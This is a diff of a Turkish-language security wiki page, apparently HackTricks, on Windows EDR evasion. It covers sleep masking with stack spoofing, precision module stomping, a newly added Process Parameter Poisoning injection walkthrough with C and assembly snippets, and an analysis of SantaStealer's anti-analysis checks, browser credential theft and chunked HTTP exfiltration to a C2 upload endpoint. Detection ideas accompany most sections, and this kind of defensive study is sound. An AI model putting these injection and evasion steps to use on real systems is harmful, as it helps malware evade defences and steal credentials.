+- Yalnızca dispatch gadget'ını değil, indirect olarak erişilen export'ları da (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, wait/event syscall'ları) ve indirect target olacak attacker-controlled executable section'ları da mark edin.
 
-Bu, ROP/JOP-style sleep chain'lerini “yalnızca non-CFG process'lerde çalışır” durumundan `/guard:cf` ile derlenmiş `explorer.exe`, browsers, `svchost.exe` ve diğer endpoint'ler için yeniden kullanılabilir bir primitive'e dönüştürür.
+Bu, ROP/JOP tarzı sleep chain'lerini “yalnızca non-CFG process'lerde çalışır” durumundan çıkarıp `explorer.exe`, browser'lar, `svchost.exe` ve `/guard:cf` ile derlenmiş diğer endpoint'ler için yeniden kullanılabilir bir primitive'e dönüştürür.
 
-### Sleeping thread'ler için CET-safe stack spoofing
+### CET-safe stack spoofing for sleeping threads
 
-Tam `CONTEXT` replacement gürültülüdür ve CET Shadow Stack sistemlerde bozulabilir; çünkü spoofed bir `Rip` hâlâ hardware shadow stack ile uyuşmalıdır. Daha güvenli bir sleep-masking pattern'i:
+Full `CONTEXT` replacement gürültülüdür ve CET Shadow Stack sistemlerinde bozulabilir; çünkü spoof edilmiş `Rip` yine de hardware shadow stack ile uyumlu olmalıdır. Daha güvenli bir sleep-masking pattern'i şöyledir:
 
-- Aynı process içinde başka bir thread seç ve `NtQueryInformationThread` ile `NT_TIB` / TEB stack bounds (`StackBase`, `StackLimit`) oku.
-- Current thread'in gerçek TEB/TIB'sini yedekle.
-- Gerçek sleeping context'i `GetThreadContext` ile yakala.
-- Spoof context'e yalnızca gerçek `Rip`'i kopyala, spoofed `Rsp`/stack state'i olduğu gibi bırak.
-- Sleep window sırasında spoof thread'in `NT_TIB`'ini current TEB içine kopyala ki stack walker'lar meşru bir stack range içinde unwind etsin.
-- Wait bittikten sonra orijinal TIB ve thread context'i geri yükle.
+- Aynı process içindeki başka bir thread'i seçin ve `NtQueryInformationThread` üzerinden thread'in `NT_TIB` / TEB stack bounds (`StackBase`, `StackLimit`) değerlerini okuyun.
+- Mevcut thread'in gerçek TEB/TIB değerlerini backup edin.
+- Gerçek sleeping context'i `GetThreadContext` ile capture edin.
+- Gerçek `Rip`'in **yalnızca kendisini** spoof context'e copy edin; spoof edilmiş `Rsp`/stack state'i olduğu gibi bırakın.
+- Sleep window sırasında, stack walker'ların legitimate bir stack range içinde unwind etmesi için spoof thread'in `NT_TIB` değerini current TEB'e copy edin.
+- Wait tamamlandıktan sonra original TIB ve thread context'i restore edin.
 
-Bu, CET-consistent instruction pointer'ı korurken unwind'leri doğrulamak için TEB stack metadata'sına güvenen EDR stack walker'ları yanıltır.
+Bu yöntem CET ile uyumlu bir instruction pointer korurken, TEB stack metadata'sına güvenerek unwind'leri doğrulayan EDR stack walker'larını yanıltır.
 
-### APC-based alternatif: Kraken Mask
+### APC-based alternative: Kraken Mask
 
-Timer-queue dispatch çok signature'lıysa, aynı sleep-encrypt-spoof-restore sequence suspended bir helper thread üzerinden queued APC'lerle çalıştırılabilir:
+Timer-queue dispatch çok signature'lıysa, aynı sleep-encrypt-spoof-restore sequence'i queued APC'ler kullanan suspended bir helper thread'den execute edilebilir:
 
-- Entrypoint olarak `NtTestAlert` ile bir helper thread oluştur.
-- Hazırlanmış `CONTEXT` frames/APC'leri `NtQueueApcThread` ile queue et ve `NtAlertResumeThread` ile drain et.
-- Default 64 KB thread stack'i tüketmemek için chain state'i helper stack yerine heap'te sakla.
-- Start event'i atomik olarak signal etmek ve block etmek için `NtSignalAndWaitForSingleObject` kullan.
-- Yarı-restore edilmiş bir stack'i scanner'ın yakalayabileceği race window'u azaltmak için TIB/context'i geri yüklemeden önce main thread'i suspend et (`NtSuspendThread` → restore → `NtResumeThread`).
+- Entrypoint olarak `NtTestAlert` bulunan bir helper thread oluşturun.
+- Hazırlanmış `CONTEXT` frame'lerini/APC'leri `NtQueueApcThread` ile queue edin ve `NtAlertResumeThread` ile drain edin.
+- Default 64 KB thread stack'ini tüketmemek için chain state'i helper stack yerine heap üzerinde saklayın.
+- Start event'ini atomik olarak signal etmek ve block olmak için `NtSignalAndWaitForSingleObject` kullanın.
+- Bir scanner'ın half-restored stack yakalayabileceği race window'u azaltmak için TIB/context'i restore etmeden önce main thread'i suspend edin (`NtSuspendThread` → restore → `NtResumeThread`).
 
-Bu, aynı RC4 masking ve stack-spoofing hedeflerini korurken `CreateTimerQueueTimer` + `NtContinue` signature'ını helper-thread/APC signature'ıyla değiştirir.
+Bu yöntem, aynı RC4 masking ve stack-spoofing hedeflerini korurken `CreateTimerQueueTimer` + `NtContinue` signature'ını helper-thread/APC signature'ı ile değiştirir.
 
 Additional detection ideas
-- `NtSetInformationVirtualMemory` ile `VmCfgCallTargetInformation`, sleep'ler, waits veya APC dispatch'ten kısa süre önce.
-- `GetThreadContext`/`SetThreadContext` etrafında `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` veya `ConnectNamedPipe`.
-- Current thread'in TEB/TIB stack bounds'una doğrudan writes'ı izleyen `NtQueryInformationThread`.
-- Dolaylı olarak `SystemFunction032`, `VirtualProtect` veya section-permission restoration helpers'a ulaşan `NtQueueApcThread`/`NtAlertResumeThread` chain'leri.
-- Signed modules içinde dispatch pivot'u olarak `FF 23` (`jmp [rbx]`) veya `FF E7` (`jmp rdi`) gibi kısa gadget signature'larının tekrarlı kullanımı.
+- Sleep, wait veya APC dispatch'ten kısa süre önce `VmCfgCallTargetInformation` ile kullanılan `NtSetInformationVirtualMemory`.
+- `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` veya `ConnectNamedPipe` etrafında wrap edilen `GetThreadContext`/`SetThreadContext`.
+- `NtQueryInformationThread` sonrasında current thread'in TEB/TIB stack bounds değerlerine yapılan direct write işlemleri.
+- Indirect olarak `SystemFunction032`, `VirtualProtect` veya section-permission restoration helper'larına ulaşan `NtQueueApcThread`/`NtAlertResumeThread` chain'leri.
+- Signed modüller içinde dispatch pivot olarak kısa gadget signature'larının (ör. `FF 23` (`jmp [rbx]`) veya `FF E7` (`jmp rdi`)) tekrarlı kullanımı.
 
 
 ## Precision Module Stomping
 
-Module stomping, payload'ları yeni bir sacrificial DLL yüklemek ya da bariz private executable memory allocate etmek yerine, hedef process içinde zaten mapped olan bir **DLL'nin `.text` section'ından** çalıştırır. Overwrite hedefi, process'in hâlâ ihtiyaç duyduğu code paths'i bozmadan payload'ı emebilecek **loaded, disk-backed image** olmalıdır.
+Module stomping, obvious private executable memory allocate etmek veya yeni bir sacrificial DLL load etmek yerine payload'ları target process içinde zaten map edilmiş bir DLL'nin **`.text` section'ından** execute eder. Overwrite target, payload'ı process'in hâlâ ihtiyaç duyduğu code path'leri bozmadan barındırabilecek **loaded, disk-backed image** olmalıdır.
 
 ### Reliable target selection
 
-`uxtheme.dll` veya `comctl32.dll` gibi yaygın module'lere karşı naive stomping kırılgandır: DLL remote process'te yüklü olmayabilir ve fazla küçük bir code region process'i crash eder. Daha güvenilir bir workflow:
+`uxtheme.dll` veya `comctl32.dll` gibi yaygın modüllere karşı naive stomping kırılgandır: DLL remote process'te yüklü olmayabilir ve çok küçük bir code region process'in crash olmasına neden olur. Daha reliable bir workflow:
 
-1. Target process modules'lerini enumerate et ve zaten loaded olan DLL'lerin yalnızca isimlerinden oluşan bir include list tut.
-2. Payload'ı önce build et ve **exact byte size**'ını kaydet.
-3. Candidate DLL'leri disk üzerinde scan et ve PE section **`.text` `Misc_VirtualSize`** değerini payload size ile karşılaştır. Bu, file size'dan daha önemlidir çünkü memory'ye map edildiğinde executable section'ın boyutunu yansıtır.
-4. **Export Address Table (EAT)**'i parse et ve stomp başlangıç offset'i olarak bir exported function RVA seç.
-5. **Blast radius**'u hesapla: payload seçilen function boundary'yi aşarsa, memory'de onun ardından gelen adjacent exports'u overwrite eder.
+1. Target process modüllerini enumerate edin ve yalnızca hâlihazırda loaded olan DLL'lerden oluşan **names-only include list** tutun.
+2. Önce payload'ı build edin ve **exact byte size** değerini kaydedin.
+3. Aday DLL'leri disk üzerinde scan edin ve PE section **`.text` `Misc_VirtualSize`** değerini payload size ile karşılaştırın. Bu, file size'dan daha önemlidir; çünkü executable section'ın **memory'ye map edildiğindeki** boyutunu yansıtır.
+4. **Export Address Table'ı (EAT)** parse edin ve stomp start offset olarak bir exported function RVA seçin.
+5. **Blast radius**'ı hesaplayın: payload seçilen function boundary'yi aşarsa memory'de onun sonrasında yerleştirilmiş adjacent export'ların üzerine yazacaktır.
 
-Vahşi ortamda görülen tipik recon/selection helpers:
+Wild'de görülen tipik recon/selection helper'ları:
 ```cmd
 list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
 python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
 python dump-exports.py -f <dll_path>
 python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
 ```
-Operasyon notları
-- `LoadLibrary`/beklenmeyen image yüklemelerinin telemetrisinden kaçınmak için uzak process içinde **zaten yüklenmiş** DLL’leri tercih edin.
-- Hedef application tarafından nadiren çalıştırılan export’ları tercih edin; aksi halde normal code path’ler thread creation’dan önce veya sonra stomped byte’lara çarpabilir.
-- Büyük implant’ler, shellcode embedding’i bir string literal’den, injector source içinde tam buffer’ın doğru temsil edilmesi için bir **byte-array/braced initializer**’a değiştirmeyi gerektirir.
+Operasyonel notlar
+- `LoadLibrary`/beklenmedik image load telemetry’sinden kaçınmak için uzak process’te **zaten yüklenmiş** DLL’leri tercih edin.
+- Hedef uygulama tarafından nadiren çalıştırılan export’ları tercih edin; aksi takdirde normal code path’leri thread oluşturulmadan önce veya sonra stomp edilmiş byte’lara erişebilir.
+- Büyük implant’lar, tüm buffer’ın injector source içinde doğru şekilde temsil edilmesi için shellcode embedding yönteminin bir string literal’den **byte-array/braced initializer** yapısına değiştirilmesini gerektirebilir.
 
 Detection fikirleri
-- Daha yaygın olan private RWX/RX allocations yerine, **image-backed executable pages** (`MEM_IMAGE`, `PAGE_EXECUTE*`) içine remote writes.
-- Bellekteki byte’ları disk üzerindeki backing file ile artık eşleşmeyen export entry point’leri.
-- Execution’ın, ilk byte’ları yakın zamanda modified edilmiş meşru bir DLL export’u içinde başladığı remote threads veya context pivots.
-- DLL `.text` pages’lerine karşı şüpheli `VirtualProtect(Ex)` / `WriteProcessMemory` sequence’leri ve ardından thread creation.
+- Daha yaygın private RWX/RX allocation’lar yerine **image-backed executable page**’lere (`MEM_IMAGE`, `PAGE_EXECUTE*`) yapılan remote write işlemleri.
+- Bellekteki byte’ları diskteki backing file ile artık eşleşmeyen export entry point’leri.
+- İlk byte’ları kısa süre önce değiştirilmiş meşru bir DLL export’u içinde çalışmaya başlayan remote thread’ler veya context pivot’ları.
+- DLL `.text` page’lerine yönelik, ardından thread creation gelen şüpheli `VirtualProtect(Ex)` / `WriteProcessMemory` sequence’leri.
 
-## SantaStealer Tradecraft for Fileless Evasion and Credential Theft
+## Process Parameter Poisoning (P3)
 
-SantaStealer (aka BluelineStealer) modern info-stealer’ların AV bypass, anti-analysis ve credential access’i tek bir workflow içinde nasıl birleştirdiğini gösterir.
+Process Parameter Poisoning (P3), klasik remote write path’ini (`VirtualAllocEx` + `WriteProcessMemory`) kullanmayan bir **process-injection / EDR-evasion** tekniğidir. Zaten çalışan bir hedefe byte kopyalamak yerine, Windows’un seçili `CreateProcessW` startup parametrelerini child process’e **kopyalaması** ve bunları `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`) içinde saklaması gerçeğini kötüye kullanır.
 
-### Keyboard layout gating & sandbox delay
+### `CreateProcessW` tarafından kopyalanan Poisonable carrier’lar
 
-- Bir config flag (`anti_cis`), `GetKeyboardLayoutList` ile yüklü keyboard layouts’u listeler. Eğer bir Cyrillic layout bulunursa, sample çalıştırıcılara geçmeden önce boş bir `CIS` marker bırakır ve sonlanır; böylece hariç tutulan locales üzerinde asla detonatе olmazken bir hunting artifact bırakır.
+Kullanışlı carrier’lar şunlardır:
+
+- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
+- `lpEnvironment` (`CREATE_UNICODE_ENVIRONMENT` ile) → `RTL_USER_PROCESS_PARAMETERS.Environment`
+- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`
+
+Pratik carrier kısıtlamaları:
+
+- `lpCommandLine`, `CreateProcessW` için **writable memory**’yi göstermelidir ve null terminator dahil **32.767 Unicode karakter** ile sınırlıdır.
+- `lpEnvironment`, ardışık `NAME=VALUE\0` string’lerinden oluşan ve ekstra bir `\0` ile sonlandırılan bir Unicode environment block olmalıdır.
+- `lpReserved` resmi olarak reserved olduğundan, `ShellInfo` mapping’i sabit ve belgelenmiş bir contract yerine bir implementation detail olarak değerlendirilmelidir.
+
+Bu, normal process creation’ı **payload-transfer primitive** haline getirir. Operator, child process’i attacker-controlled startup data ile oluşturur ve Windows’un cross-process copy işlemini gerçekleştirmesine izin verir.
+
+### Remote write API’leri olmadan remote lookup flow’u
+
+Child oluşturulduktan sonra, kopyalanan buffer’ı **read-only** primitive’ler ile resolve edin:
+
+1. `NtQueryInformationProcess(ProcessBasicInformation)` → `PROCESS_BASIC_INFORMATION.PebBaseAddress` değerini alın
+2. Remote `PEB`’i okuyun
+3. `PEB.ProcessParameters`’ı takip edin
+4. `RTL_USER_PROCESS_PARAMETERS`’ı okuyun
+5. Seçilen pointer’ı kullanın:
+- `parameters.CommandLine.Buffer`
+- `parameters.Environment`
+- `parameters.ShellInfo.Buffer`
+
+Minimal flow:
+```c
+NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
+NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
+NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
+// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
+```
+### Kopyalanan parameter buffer'ı çalıştırma
+
+Kopyalanan parameter bölgesi genellikle `RW` durumundadır ve executable değildir. Yaygın bir P3 chain şu şekildedir:
+
+1. Process'i normal şekilde oluşturun (suspended olarak değil)
+2. Seçilen parameter page'i `NtProtectVirtualMemory` / `VirtualProtectEx` ile executable hâle getirin
+3. `PROCESS_INFORMATION` içinde zaten döndürülen main thread handle'ını yeniden kullanın
+4. `NtSetContextThread` (`CONTEXT_CONTROL`, `RIP`'i overwrite ederek) ile execution'ı yönlendirin
+
+Klasik thread hijacking workflow'larının aksine bu işlem `SuspendThread` / `ResumeThread` gerektirmez; context, döndürülen main thread handle'ı üzerinden doğrudan değiştirilebilir.
+
+Bu yöntem, injection için yaygın olarak izlenen çeşitli API'lerden kaçınır:
+
+- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
+- `WriteProcessMemory` / `NtWriteVirtualMemory`
+- `CreateRemoteThread` / `NtCreateThreadEx`
+- çoğu zaman `SuspendThread` / `ResumeThread` de
+
+### Null-byte sınırlaması ve staged shellcode
+
+Her üç carrier da **string veya string-benzeri data** olduğundan, `0x00` içeren raw payload transfer sırasında truncate edilir. Pratik bir workaround, constant'ları runtime sırasında yeniden oluşturan ve ardından arbitrary bir second stage yükleyen **null-free first stage** kullanmaktır.
+
+Basit bir pattern, XOR tabanlı constant synthesis'tir:
+```asm
+mov rax, XOR_A
+mov r15, XOR_B
+xor rax, r15 ; result = desired value, without embedding 0x00 bytes
+```
+Bu, first stage'in taşınan parametreye null byte eklemeden stack string'leri, API argümanlarını, DLL path'lerini veya second-stage shellcode loader'ını oluşturmasını sağlar.
+
+### First stage'den stack tabanlı API çağrıları
+
+First stage'in `LoadLibraryA` gibi API'leri çağırması gerektiğinde şunları yapabilir:
+
+- string/buffer'ı hedef stack'ine push etmek
+- **32-byte x64 shadow space** ayırmak
+- `RCX`, `RDX`, `R8`, `R9` register'larını sabitlere veya `RSP`-relative pointer'lara ayarlamak
+- çağrıdan önce `RSP`'yi **16-byte hizalı** tutmak
+
+Ardından second stage stack'ten bir `PAGE_READWRITE` allocation'ına kopyalanabilir, `VirtualProtect` ile `PAGE_EXECUTE_READ` olarak değiştirilebilir ve doğrudan RWX allocation kullanmadan bu bölgeye jump edilebilir.
+
+### Detection fikirleri
+
+Yazarların belirttiği iyi hunting fırsatları:
+
+- **process-parameter pages** üzerinde `VirtualProtectEx` / `NtProtectVirtualMemory` ile execute permission etkinleştirilmesi
+- bu protection değişikliğinin ardından `SetThreadContext` / `NtSetContextThread` kullanılması
+- `PEB` ve ardından `RTL_USER_PROCESS_PARAMETERS` için yapılan remote read işlemleri
+- process creation sırasında olağandışı derecede uzun veya yüksek entropy'li `lpCommandLine`, `lpEnvironment` ya da `STARTUPINFO.lpReserved` değerleri
+
+### Notlar
+
+- P3, tek başına tam bir execution primitive değil, **cross-process transfer trick**'idir: kopyalanan parametrenin hâlâ execute permission değişikliğine ve bir execution redirection yöntemine ihtiyacı vardır.
+- `RtlCreateProcessReflection` / Dirty Vanity, `NtWriteVirtualMemory` ve `NtCreateThreadEx` gibi şüpheli primitive'lere dahili olarak ulaştığı için yazarlar tarafından değerlendirildi ancak reddedildi.
+
+## Fileless Evasion ve Credential Theft için SantaStealer Tradecraft'ı
+
+SantaStealer (diğer adıyla BluelineStealer), modern info-stealer'ların AV bypass, anti-analysis ve credential access yöntemlerini tek bir workflow içinde nasıl birleştirdiğini gösterir.
+
+### Keyboard layout gating ve sandbox delay
+
+- Bir config flag'i (`anti_cis`), `GetKeyboardLayoutList` aracılığıyla kurulu keyboard layout'larını enumerate eder. Cyrillic bir layout bulunursa sample boş bir `CIS` marker'ı bırakır ve stealer'ları çalıştırmadan terminate olur; böylece hariç tutulan locale'lerde hiçbir zaman detonate olmazken bir hunting artifact bırakır.
 ```c
 HKL layouts[64];
 int count = GetKeyboardLayoutList(64, layouts);
@@ -1161,25 +1257,24 @@ ExitProcess(0);
 }
 Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
 ```
-### Layered `check_antivm` logic
+### Katmanlı `check_antivm` mantığı
 
-- Variant A process listesini tarar, her ismi özel bir rolling checksum ile hash’ler ve bunu debugger/sandbox için gömülü blocklists ile karşılaştırır; ayrıca checksum’u bilgisayar adı üzerinde tekrarlar ve `C:\analysis` gibi çalışma dizinlerini kontrol eder.
-- Variant B sistem özelliklerini inceler (process-count alt sınırı, recent uptime), VirtualBox eklerini tespit etmek için `OpenServiceA("VBoxGuest")` çağırır ve single-stepping’i saptamak için sleeps etrafında timing checks uygular. Herhangi bir tespit, modules başlatılmadan önce abort eder.
+- Variant A, process listesi üzerinde dolaşır, her adı özel bir rolling checksum ile hash'ler ve sonucu debugger/sandbox blocklist'leriyle karşılaştırır; checksum işlemini computer name üzerinde tekrarlar ve `C:\analysis` gibi çalışma dizinlerini kontrol eder.
+- Variant B, system properties'i (process-count floor, recent uptime) inceler, VirtualBox additions'ı tespit etmek için `OpenServiceA("VBoxGuest")` çağrısı yapar ve single-stepping'i tespit etmek üzere sleep işlemleri çevresinde timing kontrolleri gerçekleştirir. Herhangi bir eşleşme, modüller başlatılmadan önce işlemi durdurur.
 
 ### Fileless helper + double ChaCha20 reflective loading
 
-- Birincil DLL/EXE, disk’e bırakılan ya da memory içinde manuel map edilen bir Chromium credential helper gömer; fileless mode, import/relocation çözümlemelerini kendi yapar, böylece hiçbir helper artifact’i yazılmaz.
-- Bu helper, ChaCha20 ile iki kez şifrelenmiş ikinci aşama bir DLL saklar (iki adet 32-byte key + 12-byte nonce). Her iki geçişten sonra blob’u reflectively load eder (`LoadLibrary` olmadan) ve [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption) tabanlı `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` export’larını çağırır.
-- ChromElevator rutinleri, canlı bir Chromium browser içine inject etmek için direct-syscall reflective process hollowing kullanır, AppBound Encryption anahtarlarını devralır ve ABE hardening’e rağmen passwords/cookies/credit cards verilerini doğrudan SQLite databases içinden decrypt eder.
+- Primary DLL/EXE, diske bırakılan veya memory üzerinde manuel olarak map edilen bir Chromium credential helper içerir; fileless mode, hiçbir helper artifact'i yazılmaması için import ve relocation işlemlerini kendisi çözer.
+- Bu helper, ikinci aşama DLL'ini ChaCha20 ile iki kez şifrelenmiş şekilde saklar (iki adet 32-byte key + 12-byte nonce). Her iki pass tamamlandıktan sonra blob'u reflectively load eder (`LoadLibrary` kullanılmaz) ve [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption) kaynaklı `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` export'larını çağırır.
+- ChromElevator rutinleri, canlı bir Chromium browser'a inject etmek için direct-syscall reflective process hollowing kullanır, AppBound Encryption key'lerini devralır ve ABE hardening'e rağmen password'leri/cookie'leri/credit card'ları doğrudan SQLite database'lerinden decrypt eder.
 
 
 ### Modular in-memory collection & chunked HTTP exfil
 
-- `create_memory_based_log`, global `memory_generators` function-pointer tablosu üzerinde iterasyon yapar ve etkin her module (Telegram, Discord, Steam, screenshots, documents, browser extensions, vb.) için bir thread spawn eder. Her thread sonuçları shared buffers içine yazar ve ~45 saniyelik join window sonrasında file count’unu rapor eder.
-- İşlem bittiğinde, her şey statically linked `miniz` library ile `%TEMP%\\Log.zip` olarak ziplenir. Ardından `ThreadPayload1` 15 saniye uyur ve arşivi `http://<C2>:6767/upload` adresine HTTP POST ile 10 MB chunk’lar halinde stream eder; browser `multipart/form-data` boundary’sini (`----WebKitFormBoundary***`) spoof eder. Her chunk `User-Agent: upload`, `auth: <build_id>`, opsiyonel `w: <campaign_tag>` ekler ve son chunk `complete: true` ekler, böylece C2 yeniden birleştirmenin tamamlandığını bilir.
+- `create_memory_based_log`, global `memory_generators` function-pointer table üzerinde dolaşır ve etkin her modül için bir thread oluşturur (Telegram, Discord, Steam, screenshots, documents, browser extensions vb.). Her thread sonuçları shared buffer'lara yazar ve yaklaşık 45 saniyelik join window sonrasında file count değerini bildirir.
+- Tamamlandıktan sonra her şey, statically linked `miniz` library kullanılarak `%TEMP%\\Log.zip` olarak zip'lenir. Ardından `ThreadPayload1` 15 saniye sleep eder ve arşivi HTTP POST üzerinden 10 MB'lık chunk'lar halinde `http://<C2>:6767/upload` adresine stream eder; browser `multipart/form-data` boundary'sini (`----WebKitFormBoundary***`) spoof eder. Her chunk `User-Agent: upload`, `auth: <build_id>` ve isteğe bağlı `w: <campaign_tag>` header'larını ekler; son chunk ise C2'nin reassembly işleminin tamamlandığını bilmesi için `complete: true` ekler.
 
 ## References
-
 
 - [Advanced Evasion Tradecraft: Precision Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
 - [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
@@ -1208,9 +1303,10 @@ Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxe
 - [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
 - [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
 - [Sleeping Beauty: Putting Adaptix to Bed with Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
+- [SensePost – Process Parameter Poisoning](https://sensepost.com/blog/2026/process-parameter-poisoning/)
+- [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
 - [Sleeping Beauty II: CFG, CET, and Stack Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
 - [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
 - [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
-
 
 {{#include ../banners/hacktricks-training.md}}
